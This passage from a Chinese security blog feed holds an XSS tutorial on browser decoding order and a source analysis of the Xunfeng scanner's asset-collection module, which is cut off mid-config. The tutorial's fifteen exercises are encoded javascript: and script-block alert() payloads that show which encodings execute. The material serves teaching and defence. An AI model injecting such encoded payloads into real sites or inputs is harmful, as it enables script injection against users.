elements</code>)，例如<code>MathML</code>命名空间或者<code>SVG</code>命名空间的元素</p></li><li><p>基本元素(<code>Normal elements</code>)，即除了以上4种元素以外的元素</p></li></ol><p><strong>五类元素的区别如下：</strong></p><ol><li>空元素，不能容纳任何内容（因为它们没有闭合标签，没有内容能够放在开始标签和闭合标签中间）。</li><li>原始文本元素，可以容纳文本。</li><li><code>RCDATA</code>元素，可以容纳文本和字符引用。</li><li>外部元素，可以容纳文本、字符引用、<code>CDATA</code>段、其他元素和注释</li><li>基本元素，可以容纳文本、字符引用、其他元素和注释</li></ol><p>对RCDATA有个特殊的情况</p><p>在浏览器解析RCDATA元素的过程中，解析器会进入“RCDATA状态”。</p><p>在这个状态中，如果遇到“<code>&lt;</code>”字符，它会转换到“<code>RCDATA小于号状态</code>”。如果“<code>&lt;</code>”字符后没有紧跟着“<code>/</code>”和对应的标签名，解析器会转换回“<code>RCDATA状态</code>”。这意味着在<code>RCDATA</code>元素标签的内容中（例如<code>&lt;textarea&gt;</code>或<code>&lt;title&gt;</code>的内容中），唯一能够被解析器认做是标签的就是“<code>&lt;/textarea&gt;</code>”或者“<code>&lt;/title&gt;</code>”</p><h2 id="URL解码器"><a href="#URL解码器" class="headerlink" title="URL解码器"></a>URL解码器</h2><p>首先，URL资源类型必须是ASCII字母（U+0041-U+005A || U+0061-U+007A），不然就会进入“无类型”状态。</p><p>例如，你不能对协议类型进行任何的编码操作，不然URL解析器会认为它无类型。</p><p>同时，URL编码过程使用UTF-8编码类型来编码每一个字符。</p><p>如果你尝试着将URL链接做了其他编码类型的编码，URL解析器就可能不会正确识别。</p><h2 id="Javascript解码器"><a href="#Javascript解码器" class="headerlink" title="Javascript解码器"></a>Javascript解码器</h2><p>所有的“<code>script</code>”块都属于“原始文本”元素。</p><p>“<code>script</code>”块有个有趣的属性：在块中的字符引用并不会被解析和解码。</p><p>如果你去看“脚本数据状态”的状态转换规则，就会发现没有任何规则能转移到字符引用状态。</p><p>所以如果攻击者尝试着将输入数据编码成字符实体并将其放在<code>script</code>块中，它将不会被执行。</p><p><strong>标识符名称中：</strong></p><p>当Unicode转义序列出现在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。</p><p><strong>控制字符:</strong></p><p>当用<code>Unicode</code>转义序列来表示一个控制字符时，例如单引号、双引号、圆括号等等，它们将不会被解释成控制字符，而仅仅被解码并解析为标识符名称或者字符串常量。如果你去看ECMAScript的语法，就会发现没有一处会用<code>Unicode</code>转义序列来当作控制字符。例如，如果解析器正在解析一个函数调用语句，圆括号部分必须为“<code>(</code>”和“<code>)</code>”，而不能是<code>\u0028</code>和<code>\u0029</code>。</p><h2 id="浏览器解析顺序"><a href="#浏览器解析顺序" class="headerlink" title="浏览器解析顺序"></a>浏览器解析顺序</h2><p>当浏览器从网络堆栈中获得一段内容后，触发HTML解析器来对这篇文档进行词法解析</p><p>在这一步中字符引用被解码。</p><p>在词法解析完成后，DOM树就被创建好了，JavaScript解析器会介入来对内联脚本进行解析。</p><p>在这一步中Unicode转义序列和Hex转义序列被解码。</p><p>同时，如果浏览器遇到需要URL的上下文，URL解析器也会介入来解码URL内容。</p><p>在这一步中URL解码操作被完成。</p><p>由于URL位置不同，URL解析器可能会在JavaScript解析器之前或之后进行解析。</p><p>考虑如下两种情况：</p><blockquote><p>Example A:<code>&lt;a href=&quot;UserInput&quot;&gt;&lt;/a&gt;</code><br>Example B: <code>&lt;a href=# onclick=&quot;window.open(&#39;UserInput&#39;)&quot;&gt;&lt;/a&gt;</code></p></blockquote><p>在例A中，HTML解析器将首先开始工作，并对UserInput中的字符引用进行解码。然后URL解析器开始对href值进行URL解码。最后，如果URL资源类型是JavaScript，那么JavaScript解析器会进行Unicode转义序列和Hex转义序列的解码。再之后，解码的脚本会被执行。因此，这里涉及三轮解码，顺序是HTML，URL和JavaScript。</p><p>在例B中，HTML解析器首先工作。然而接下来，JavaScript解析器开始解析在onclick事件处理器中的值。这是因为在onclick事件处理器中是script的上下文。当这段JavaScript被解析并被执行的时候，它执行的是“window.open()”操作，其中的参数是URL的上下文。在此时，URL解析器开始对UserInput进行URL解码并把结果回传给JavaScript引擎。因此这里一共涉及三轮解码，顺序是HTML，JavaScript和URL。</p><h1 id="几个小练习"><a href="#几个小练习" class="headerlink" title="几个小练习"></a>几个小练习</h1><h2 id="Question-1"><a href="#Question-1" class="headerlink" title="Question 1"></a>Question 1</h2><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"</span>&gt;&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure><p><a href="%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29">Clickme</a><br>不能对协议类做任何的编码操作，否则URL编码器会任务他是无类型的</p><h2 id="Question-2"><a href="#Question-2" class="headerlink" title="Question 2"></a>Question 2</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span>:%61%6c%65%72%74%28%32%29"</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61%6c%65%72%74%28%32%29">Click me</a></p><p>这时候<code>&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29</code>处于属性值下的字符应用</p><p>这时候HTML解码器会尝试对前半部分的<code>&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;</code>进行HTML解码</p><p>此时<code>href</code>中的<code>javascript:%61%6c%65%72%74%28%32%29</code>会被URL解码器进行解码</p><p>最后由于是<code>Javascript</code>协议，<code>Javascript</code>解析器会开始工作，从而执行<code>JS</code>脚本</p><h2 id="Question-3"><a href="#Question-3" class="headerlink" title="Question 3"></a>Question 3</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript%3aalert(3)"</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="javascript%3aalert(3)">Click me</a></p><p>同时对于冒号而言，不能进行编码处理，否则同样会被URL编码器认定为无类型</p><h2 id="Question-4"><a href="#Question-4" class="headerlink" title="Question 4"></a>Question 4</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="symbol">&amp;#60;</span>img src=x onerror=alert(4)<span class="symbol">&amp;#62;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><div>&#60;img src=x onerror=alert(4)&#62;</div><p>在解析完<code>&lt;div&gt;</code>标签后，后面的<code>&amp;#60;</code>会被解析为<code>&lt;</code>，但此时不会再进入标签开始状态，导致新的标签不会建立</p><h2 id="Question-5"><a href="#Question-5" class="headerlink" title="Question 5"></a>Question 5</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="symbol">&amp;#60;</span>script<span class="symbol">&amp;#62;</span>alert(5)<span class="symbol">&amp;#60;</span>/script<span class="symbol">&amp;#62;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p><textarea>&#60;script&#62;alert(5)&#60;/script&#62;</textarea></p><p><code>RCDATA</code>元素内只会解析<code>&lt;textarea&gt;和&lt;title&gt;</code>作为标签，其他情况只会认定为RCDATA小于号状态，而不是标签状态，所以不会解析</p><h2 id="Question-6"><a href="#Question-6" class="headerlink" title="Question 6"></a>Question 6</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(6)<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p><textarea><script>alert(6)</script></textarea></p><p>原因同上</p><h2 id="Question-7"><a href="#Question-7" class="headerlink" title="Question 7"></a>Question 7</h2><figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">button</span> <span class="keyword">onclick</span>=<span class="string">"confirm('7&amp;#39;);"</span>&gt;<span class="keyword">Button</span>&lt;/<span class="keyword">button</span>&gt;</span><br></pre></td></tr></table></figure><p><button onclick="confirm('7&#39;);">Button</button><br>这里先经过<code>HTML</code>解码，然后会恢复成<code>&#39;</code>，由于<code>onclick</code>的存在，JS解析器成功执行弹窗</p><h2 id="Question-8"><a href="#Question-8" class="headerlink" title="Question 8"></a>Question 8</h2><figure class="highlight hsp"><table><tr><td class="code"><pre><span class="line">&lt;<span class="keyword">button</span> <span class="keyword">onclick</span>=<span class="string">"confirm('8\u0027);"</span>&gt;<span class="keyword">Button</span>&lt;/<span class="keyword">button</span>&gt;</span><br></pre></td></tr></table></figure><p><button onclick="confirm('8\u0027);">Button</button></p><p>在<code>Javascript</code>中，控制字符不能被<code>Unicode</code>编码，否则不会触发</p><h2 id="Question-9"><a href="#Question-9" class="headerlink" title="Question 9"></a>Question 9</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span>&amp;#116<span class="symbol">&amp;#40;</span><span class="symbol">&amp;#57;</span><span class="symbol">&amp;#41;</span>&amp;#59</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><script>&#97;&#108;&#101;&#114;&#116&#40;&#57;&#41;&#59</script><p>在<code>script</code>标签内进行编码解码都不会执行，只能输入原始语句</p><h2 id="Question-10"><a href="#Question-10" class="headerlink" title="Question 10"></a>Question 10</h2><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="symbol">\u</span>0061<span class="symbol">\u</span>006c<span class="symbol">\u</span>0065<span class="symbol">\u</span>0072<span class="symbol">\u</span>0074(10);&lt;/script&gt;</span><br></pre></td></tr></table></figure><script>\u0061\u006c\u0065\u0072\u0074(10);</script><p>当Unicode转义序列出现在标识符名称中时，它会被解码并解释为标识符名称的一部分，例如函数名，属性名等等</p><h2 id="Question-11"><a href="#Question-11" class="headerlink" title="Question 11"></a>Question 11</h2><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="symbol">\u</span>0061<span class="symbol">\u</span>006c<span class="symbol">\u</span>0065<span class="symbol">\u</span>0072<span class="symbol">\u</span>0074<span class="symbol">\u</span>0028<span class="symbol">\u</span>0031<span class="symbol">\u</span>0031<span class="symbol">\u</span>0029&lt;/script&gt;</span><br></pre></td></tr></table></figure><script>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</script><p>同上，控制字符不能被编码处理</p><h2 id="Question-12"><a href="#Question-12" class="headerlink" title="Question 12"></a>Question 12</h2><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="symbol">\u</span>0061<span class="symbol">\u</span>006c<span class="symbol">\u</span>0065<span class="symbol">\u</span>0072<span class="symbol">\u</span>0074(<span class="symbol">\u</span>0031<span class="symbol">\u</span>0032)&lt;/script&gt;</span><br></pre></td></tr></table></figure><script>\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)</script><p>这里<code>\u0031\u0032</code>不会被当做字符串常量，除非用引号包裹</p><h2 id="Question-13"><a href="#Question-13" class="headerlink" title="Question 13"></a>Question 13</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('13\u0027)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><script>alert('13\u0027)</script><p><code>\u0027</code>只会被解释为文本单引号，而不是控制字符</p><h2 id="Question-14"><a href="#Question-14" class="headerlink" title="Question 14"></a>Question 14</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'14\u000a'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><script>alert('14\u000a')</script><p>这里<code>\u000a</code>会被解释为换行符文本，而不是控制字符，不会引起<code>Javascript</code>错误，从而会弹窗，实际上这时候弹的是14加上一个换行符文本</p><h2 id="Question-15"><a href="#Question-15" class="headerlink" title="Question 15"></a>Question 15</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"<span class="symbol">&amp;#x6a;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3a;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x36;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x36;</span>&amp;#x25<span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x32;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x30;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x37;</span><span class="symbol">&amp;#x25;</span><span class="symbol">&amp;#x33;</span><span class="symbol">&amp;#x34;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x35;</span><span class="symbol">&amp;#x29;</span>"</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x28;&#x31;&#x35;&#x29;">Click me</a></p><p>这个会触发，这里仔细讲一下解码流程：</p><ol><li>首先看到<code>&lt;a</code>标签，知道要进行<code>HTML</code>解码了，对属性当中的字符引用进行解码</li><li>解码得到<code>&lt;a href=&quot;javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36&amp;#x2535%5c%75%30%30%37%32%5c%75%30%30%37%&amp;# x33;4(15)&quot;&gt;Click me&lt;/a&gt;</code></li><li>此时<code>href</code>看到<code>javascript:</code>协议，符合<code>URL</code>解码条件，开始<code>URL</code>解码</li><li>解码得到<code>&lt;a href=&quot;javascript:\u0061\u006c\u0065\u0072\u0074(15)&quot;&gt;Click me&lt;/a&gt;</code></li><li>这时候Javascript解析器开始工作，把后面的部分进行<code>Unicode</code>解码，由于括号等控制字符没有被<code>Unicode</code>编码，这里会解码后正常弹窗</li></ol><p><strong>最终解码过程：</strong></p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200327211803991.png" alt="image-20200327211803991"></p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>那几个无法触发的弹窗，错误原因都是这几个</p><p><img src="https://a2u13-pic.oss-accelerate.aliyuncs.com/pic/image-20200327211942977.png" alt="image-20200327211942977"></p><p>无效的标记Hhhh</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;本文内容：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;从浏览器编码解码的角度看待XSS是怎么产生的以及我们应该怎么防御XSS&lt;/p&gt;
    
    </summary>
    
    
      <category term="前端安全" scheme="https://a2u13.com/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="XSS" scheme="https://a2u13.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>巡风漏洞扫描系统资产搜集模块源码分析</title>
    <link href="https://a2u13.com/2020/03/25/%E5%B7%A1%E9%A3%8E%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%B3%BB%E7%BB%9F%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86%E6%A8%A1%E5%9D%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>https://a2u13.com/2020/03/25/%E5%B7%A1%E9%A3%8E%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%B3%BB%E7%BB%9F%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86%E6%A8%A1%E5%9D%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2020-03-25T15:44:53.000Z</published>
    <updated>2020-06-07T06:28:28.917Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文内容：</strong></p><p>巡风漏洞扫描系统资产搜集模块源码分析</p><a id="more"></a><h1 id="框架目录"><a href="#框架目录" class="headerlink" title="框架目录"></a>框架目录</h1><figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── <span class="class"><span class="keyword">lib</span></span></span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── cidr.py</span><br><span class="line">│   ├── common.py</span><br><span class="line">│   ├── icmp.py</span><br><span class="line">│   ├── log.py</span><br><span class="line">│   ├── mongo.py</span><br><span class="line">│   ├── scan.py</span><br><span class="line">│   └── start.py</span><br><span class="line">├── nascan.py</span><br><span class="line">└── plugin</span><br><span class="line">    └── masscan.py</span><br></pre></td></tr></table></figure><h1 id="主函数"><a href="#主函数" class="headerlink" title="主函数"></a>主函数</h1><h2 id="读取配置信息"><a href="#读取配置信息" class="headerlink" title="读取配置信息"></a>读取配置信息</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">CONFIG_INI = get_config()  <span class="comment"># 读取配置</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_config</span><span class="params">()</span>:</span></span><br><span class="line">    config = &#123;&#125;</span><br><span class="line">    config_info = mongo.na_db.Config.find_one(&#123;<span class="string">"type"</span>: <span class="string">"nascan"</span>&#125;)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> config_info[<span class="string">'config'</span>]:</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">in</span> [<span class="string">'Discern_cms'</span>, <span class="string">'Discern_con'</span>, <span class="string">'Discern_lang'</span>, <span class="string">'Discern_server'</span>]:</span><br><span class="line">            config[name] = format_config(name, config_info[<span class="string">'config'</span>][name][<span class="string">'value'</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            config[name] = config_info[<span class="string">'config'</span>][name][<span class="string">'value'</span>]</span><br><span class="line">    <span class="keyword">return</span> config</span><br></pre></td></tr></table></figure><p>大概意思是从数据库里找到<code>type</code>为<code>nascan</code>的集合</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">"type"</span>: <span class="string">"nascan"</span>,</span><br><span class="line"><span class="attr">"config"</span>: &#123;</span><br><span class="line"><span class="attr">"Scan_list"</span>: &#123;</span><br><span class="line"><span class="attr">"value"</span>: <span class="string">""</span>,</span><br><span class="line"><span class="attr">"info"</span>: <span class="string">"网络资产探测列表(必填)"</span>,</span><br><span class="line"><span class="attr">"help"</span>: <span class="string">"指定爬虫引擎探测范围，格式：192.168.1.1-192.168.1.254(修改会立刻触发资产扫描收集)"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"Discern_cms"</span>: &#123;</span><br><span class="line"><span class="attr">"value"</span>: <span class="string">"phpmyadmin|file|index|pma_username\nphpmyadmin|file|/phpmyadmin|pma_username\nrouteros|file|index|&lt;title&gt;RouterOS router configuration page&lt;\\/title&gt;\ndestoon|file|index|Powered by DESTOON\ndestoon|file|index|DESTOON B2B SYSTEM\nU-mail|file|index|Power(ed)? by[^&gt;]+U-Mail\nWinmail|file|index|Winmail Mail Server\nCoremail|file|index|Coremail[^&gt;]+&lt;\\/title&gt;\nWinmail|header|Set-Cookie|magicwinmail\nWinmail|file|index|Powered by Winmail Server\nTurboMail|file|index|Powered by TurboMail \nXmail|file|index|\\d&#123;4&#125;-\\d&#123;4&#125;\\s*webmail.idccenter.net\noutlook|header|X-OWA-Version|.*?\noutlook|file|index|Outlook Web (Access|App)\\s*(?=&lt;\\/title&gt;)\nAnymacro|header|Server|AnyWebApp\nAnymacro|file|index|sec.anymacro.com\nExtMail|file|index|powered by.*?Extmail\nLotus|file|index|IBM Lotus iNotes[^&gt;]+(?=&lt;\\/title&gt;)\nLotus|file|index|iwaredir.nsf\nSquirrelMail|file|index|SquirrelMail Project Team\nSquirrelMail|header|Set-Cookie|SQMSESSID\nSquirrelMail|file|index|SquirrelMail\neqmail|file|index|Powered by EQMail\nTMailer|file|index|TMailer Collaboration Suite Web Client \nzimbra|header|Set-Cookie|ZM_TEST\nzimbra|file|index|zimbra[^&gt;]+(?=&lt;\\/title&gt;)\nzimbra|file|index|Zimbra,?\\s*Inc. All rights reserved.\nbxemail|file|index|abc@bxemail.com\nHorde|file|index|&lt;title&gt;[^&gt;]+?Horde\nHorde|file|index|\\/themes\\/graphics\\/horde-power1.png\nAtmail|file|index|powered by Atmail\nIlohaMail|header|Set-Cookie|IMAIL_TEST_COOKIE\nIlohaMail|header|SESS_KEY|.*?\nIlohaMail|file|index|powered by[^&gt;]+IlohaMail\nfangmail|file|index|fangmail\nRoundcube|file|index|Roundcube\nmailbase|header|Set-Cookie|\\s*(mb_lang|mb_ui_type|mb_cus_type)\nmailbase|file|index|MailBase[^&lt;&gt;]+(?=&lt;\\/title&gt;)\nKXmail|file|index|Powered By\\s?&lt;[^&gt;]+&gt;\\s?KXmail\ntongda|file|index|href=\"/images/tongda\\.ico\"\ntrs_wcm|file|index|&lt;title[^&gt;]+&gt;TRS WCM[^&lt;]+&lt;/title&gt;\ntrs_wcm|file|index|href=\"/wcm/console/auth/reg_newuser.jsp\"\nmymps|file|index|powered by[^&amp;]+Mymps.*?\nmymps|file|index|wcontent=\"mymps\nmailgard|file|index|mailgard\\swebmail\ndiscuz|file|/robots.txt|discuz\ndiscuz|file|/robots.txt|discuz\nphpwind|file|/robots.txt|phpwind\nphpcms|file|/robots.txt|phpcms\nphp168|file|/robots.txt|php168\nqibosoft|file|/robots.txt|qibocms\nemlog|file|/robots.txt|robots.txt for emlog\nwecenter|file|/robots.txt|robots.txt for wecenter\nbbsmax|file|/robots.txt|bbsmax\nshopnc|file|/robots.txt|robots.txt for shopnc\nhdwike|file|/robots.txt|robots.txt for hdwiki\nphpdisk|file|/robots.txt|PHPDisk\ndedecms|file|/data/admin/ver.txt|20110812\ndedecms|file|/data/admin/ver.txt|20111111\ndedecms|file|/data/admin/ver.txt|20120709\ndedecms|file|/data/admin/ver.txt|20140814\ndedecms|file|/data/admin/verifies.txt|20081204\ndedecms|file|/data/admin/verifies.txt|20100324\ndedecms|file|/data/admin/verifies.txt|20100514\ndedecms|file|/data/admin/verifies.txt|20110216\nwordpress|file|/robots.txt|wordpress\nwordpress|file|/license.txt|wordpress\nwordpress|file|/readme.txt|wordpress\nwordpress|file|/help.txt|wordpress\nwordpress|file|/readme.html|wordpress\nwordpress|file|/wp-admin/css/colors-classic.css|wordpress\nwordpress|file|/wp-admin/js/media-upload.dev.js|wordpress\nwordpress|file|/wp-content/plugins/akismet/akismet.js|wordpress\nwordpress|file|/wp-content/themes/classic/rtl.css|wordpress\nwordpress|file|/wp-includes/css/buttons.css|wordpress\nz-blog|file|/license.txt|z-bolg\nz-blog|file|/SCRIPT/common.js|z-bolg\nsouthidc|file|/Ads/left.js|southidc\nsouthidc|file|/Css/Style.css|southidc\nsouthidc|file|/Images/ad.js|southidc\nsouthidc|file|/Script/Html.js|southidc\nsiteserver|file|/robots.txt|\\/SiteFiles\\/\nsiteserver|file|/SiteFiles/Inner/Register/script.js|stlUserRegister\nenableq|file|/License/index.php|&lt;td&gt;EnableQ\nenableq|file|/robots.txt|robots.txt for EnableQ\ntrs_wcm|file|/wcm/app/login.jsp|TRS WCM\ntrs_wcm|file|/wcm/app/login.jsp|href=\"/wcm/console/auth/reg_newuser.jsp\"\nmymps|file|/robots.txt|mymps\nigenus|file|/help/|igenus\nmailgard|file|/help/io_login.html|webmail"</span>,</span><br><span class="line"><span class="attr">"info"</span>: <span class="string">"cms识别规则"</span>,</span><br><span class="line"><span class="attr">"help"</span>: <span class="string">"用于识别WEB的CMS，格式：CMS名称|判断方式|判断对象|判断正则。识别信息保存于tag记录中，可使用tag:dedecms方式进行搜索。"</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">"Discern_con"</span>: &#123;</span><br><span class="line"><span class="attr">"value"</span>: <span class="string">"jboss|header|X-Powered-By|jboss\njboss|file|jboss.css|youcandoit.jpg\njboss|file|is_test|JBossWeb\naxis|file|axis2|axis2-web/images/axis_l.jpg\nweblogic|file|is_test|Hypertext Transfer Protocol\nweblogic|file|console/css/login.css|Login_GC_LoginPage_Bg.gif\nglassfish|file|resource/js/cj.js|glassfish.dev.java.net\nglassfish|header|server|GlassFish\njenkins|header|X-Jenkins|.*?\njenkins|file|index|\\[Jenkins\\]\nresin|header|server|resin\ntomcat|file|is_test|Apache 